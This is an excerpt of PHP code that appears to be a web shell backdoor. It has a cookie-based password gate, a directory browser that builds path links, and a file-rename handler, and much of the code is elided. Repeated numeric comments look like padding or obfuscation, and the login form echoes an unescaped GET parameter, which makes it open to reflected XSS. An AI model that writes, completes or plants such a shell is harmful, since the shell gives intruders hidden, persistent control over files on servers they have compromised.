...
$pass = false;
if (isset($_COOKIE['pw_name_39699'])) {
    if(($_COOKIE['pw_name_39699']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_39699'])) {
        if(($_POST['pw_name_39699']) == $auth_key) {
            setcookie("pw_name_39699", $_POST['pw_name_39699']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_39699' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720861603514457 1720861603644750 1720861603472567 1720861603241386
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720861603514457 1720861603644750 1720861603472567 1720861603241386
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720861603514457 1720861603644750 1720861603472567 1720861603241386
            $name = PATH . "/" . $_GET['r'];
